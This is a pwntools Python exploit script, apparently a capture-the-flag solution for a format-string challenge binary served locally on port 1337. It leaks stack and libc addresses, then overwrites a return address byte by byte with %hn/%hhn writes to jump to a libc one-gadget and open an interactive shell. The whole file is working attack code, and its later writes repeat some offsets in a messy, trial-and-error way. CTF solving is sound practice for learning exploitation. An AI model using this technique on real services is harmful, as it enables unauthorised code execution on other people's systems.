#!/usr/bin/env python3

'''
    author: GeekCmore
    time: 2025-10-02 11:40:41
'''
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context(log_level='debug',arch='amd64',os='linux')
filename = "fmt_patched"
libcname = "/root/.config/cpwn/pkgs/2.31-0ubuntu9.17/amd64/libc6_2.31-0ubuntu9.17_amd64/lib/x86_64-linux-gnu/libc.so.6"
host = "127.0.0.1"
port = 1337
container_id = ""
proc_name = ""
elf = context.binary = ELF(filename)
if libcname:
    libc = ELF(libcname)
gs = '''
b main
set debug-file-directory /root/.config/cpwn/pkgs/2.31-0ubuntu9.17/amd64/libc6-dbg_2.31-0ubuntu9.17_amd64/usr/lib/debug
set directories /root/.config/cpwn/pkgs/2.31-0ubuntu9.17/amd64/glibc-source_2.31-0ubuntu9.17_all/usr/src/glibc/glibc-2.31
'''
sym ="add-symbol-file /root/.config/cpwn/pkgs/2.31-0ubuntu9.17/amd64/libc6-dbg_2.31-0ubuntu9.17_amd64/usr/lib/debug"
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript = gs)
    elif args.REMOTE:
        return remote(host, port)
    elif args.DOCKER:
        import docker
        from os import path
        p = remote(host, port)
        client = docker.from_env()
        container = client.containers.get(container_id=container_id)
        processes_info = container.top()
        titles = processes_info['Titles']
        processes = [dict(zip(titles, proc)) for proc in processes_info['Processes']]
        target_proc = []
        for proc in processes:
            cmd = proc.get('CMD', '')
            exe_path = cmd.split()[0] if cmd else ''
            exe_name = path.basename(exe_path)
            if exe_name == proc_name:
                target_proc.append(proc)
        idx = 0
        if len(target_proc) > 1:
            for i, v in enumerate(target_proc):
                print(f"{i} => {v}")
            idx = int(input(f"Which one:"))
        import tempfile
        with tempfile.NamedTemporaryFile(prefix = 'cpwn-gdbscript-', delete=False, suffix = '.gdb', mode = 'w') as tmp:
            tmp.write(f'shell rm {tmp.name}\n{gs}')
        print(tmp.name)
        run_in_new_terminal(["sudo", "gdb", "-p", target_proc[idx]['PID'], "-x", tmp.name])
        return p
    else:
        return process(elf.path)

io = start()
io.recvuntil(b"Gift: ")

rsp = io.recvuntil('\n').decode().rjust(16,'0')
rsp = int(rsp,16)-0x4
success(hex(rsp))

payload1=b'%p'*9+b'%'+str((rsp-0x8)-90).encode()+b'c%hn'
payload1+=b'%p'*26+b'%'+str(0x100009-((rsp-0x8)-90)-0x69).encode()+b'c%hhn'
#gdb.attach(io)
io.send(payload1)

io.recvuntil(b"Gift: ")
payload2=b'%'+str(0x10).encode()+b'c%39$hhn'
payload2+=b'%9$p\x00\x00'
io.send(payload2)
io.recvuntil(b'0x')
buf = io.recv(12).decode().rjust(16,'0')
libcbase = int(buf,16)-libc.sym['__libc_start_main']-234-9
success(hex(libcbase))
''''''
onegadget=0xe3b01+libcbase
success(hex(onegadget))

io.recvuntil(b"Gift: ")
#gdb.attach(io)
payload3=b'%'+str(0x10).encode()+b'c%39$hhn'
payload3+=b'%'+str(rsp-0x10).encode()+b'c%27$hn\x00'
io.send(payload3)

io.recvuntil(b"Gift: ")
#gdb.attach(io)
payload3=b'%'+str(0x10).encode()+b'c%39$hhn'
payload3+=b'%'+str((onegadget&0xff)-0x10).encode()+b'c%41$hhn\x00'
io.send(payload3)

io.recvuntil(b"Gift: ")
#gdb.attach(io)
payload3=b'%'+str(0x10).encode()+b'c%39$hhn'
payload3+=b'%'+str(rsp+0x1-0x10).encode()+b'c%27$hn\x00'
io.send(payload3)

io.recvuntil(b"Gift: ")
#gdb.attach(io)
payload3=b'%'+str(0x10).encode()+b'c%39$hhn'
payload3+=b'%'+str(((onegadget>>8)&0xff)-0x10).encode()+b'c%41$hhn\x00'
io.send(payload3)

io.recvuntil(b"Gift: ")
#gdb.attach(io)
payload3=b'%'+str(0x10).encode()+b'c%39$hhn'
payload3+=b'%'+str(rsp+0x1+0x1-0x10).encode()+b'c%27$hn\x00'
io.send(payload3)

io.recvuntil(b"Gift: ")
#gdb.attach(io)
payload3=b'%'+str(0x10).encode()+b'c%39$hhn'
payload3+=b'%'+str(((onegadget>>16)&0xff)-0x10).encode()+b'c%41$hhn\x00'
io.send(payload3)

io.recvuntil(b"Gift: ")
#gdb.attach(io)
payload3=b'%'+str(0x10).encode()+b'c%39$hhn'
payload3+=b'%'+str(rsp+0x1+0x1+0x1-0x10).encode()+b'c%27$hn\x00'
io.send(payload3)

io.recvuntil(b"Gift: ")
#gdb.attach(io)
payload3=b'%'+str(0x10).encode()+b'c%39$hhn'
payload3+=b'%'+str(((onegadget>>24)&0xff)-0x10).encode()+b'c%41$hhn\x00'
io.send(payload3)

io.recvuntil(b"Gift: ")
#gdb.attach(io)
payload3=b'%'+str(0x10).encode()+b'c%39$hhn'
payload3+=b'%'+str(rsp+0x1+0x1+0x1+0x1-0x10).encode()+b'c%27$hn\x00'
io.send(payload3)

io.recvuntil(b"Gift: ")
#gdb.attach(io)
payload3=b'%'+str(0x10).encode()+b'c%39$hhn'
payload3+=b'%'+str(((onegadget>>32)&0xff)-0x10).encode()+b'c%41$hhn\x00'
io.send(payload3)

io.recvuntil(b"Gift: ")
#gdb.attach(io)
payload3=b'%'+str(0x10).encode()+b'c%39$hhn'
payload3+=b'%'+str(rsp+0x1+0x1+0x1+0x1+0x1-0x10).encode()+b'c%27$hn\x00'
io.send(payload3)

io.recvuntil(b"Gift: ")
#gdb.attach(io)
payload3=b'%'+str(0x10).encode()+b'c%39$hhn'
payload3+=b'%'+str(((onegadget>>40)&0xff)-0x10).encode()+b'c%41$hhn\x00'
io.send(payload3)

io.recvuntil(b"Gift: ")
#gdb.attach(io)
payload3=b'%'+str(0x10).encode()+b'c%39$hhn'
payload3+=b'%'+str(rsp+0x1+0x1+0x1+0x1+0x1+0x1-0x10).encode()+b'c%27$hn\x00'
io.send(payload3)

io.recvuntil(b"Gift: ")
#gdb.attach(io)
payload3=b'%'+str(0x10).encode()+b'c%39$hhn'
payload3+=b'%'+str(((onegadget>>48)&0xff)-0x10).encode()+b'c%41$hhn\x00'
io.send(payload3)

io.recvuntil(b"Gift: ")
#gdb.attach(io)
payload3=b'%'+str(0x10).encode()+b'c%39$hhn'
payload3+=b'%'+str(rsp+0x1+0x1+0x1+0x1+0x1+0x1-0x10).encode()+b'c%27$hn\x00'
io.send(payload3)

io.recvuntil(b"Gift: ")
#gdb.attach(io)
payload3=b'%'+str(0x10).encode()+b'c%39$hhn'
payload3+=b'%'+str((0x10000)-0x10).encode()+b'c%41$hhn\x00'
io.send(payload3)

io.recvuntil(b"Gift: ")
#gdb.attach(io)
payload3=b'%'+str(0x10).encode()+b'c%39$hhn'
payload3+=b'%'+str(rsp+0x1-0x10).encode()+b'c%27$hn\x00'
io.send(payload3)

io.recvuntil(b"Gift: ")
#gdb.attach(io)
payload3=b'%'+str(0x10).encode()+b'c%39$hhn'
payload3+=b'%'+str(((onegadget>>8)&0xff)-0x10).encode()+b'c%41$hhn\x00'
io.send(payload3)

io.recvuntil(b"Gift: ")
#gdb.attach(io)
payload3=b'%'+str(0x10).encode()+b'c%39$hhn'
payload3+=b'%'+str(rsp+0x1+0x1-0x10).encode()+b'c%27$hn\x00'
io.send(payload3)

io.recvuntil(b"Gift: ")
#gdb.attach(io)
payload3=b'%'+str(0x10).encode()+b'c%39$hhn'
payload3+=b'%'+str(((onegadget>>16)&0xff)-0x10).encode()+b'c%41$hhn\x00'
io.send(payload3)

success(hex(onegadget))
io.recvuntil(b"Gift: ")
gdb.attach(io)
payload3=b'%'+str(0xc4).encode()+b'c%39$hhn\x00'
io.send(payload3)

io.interactive()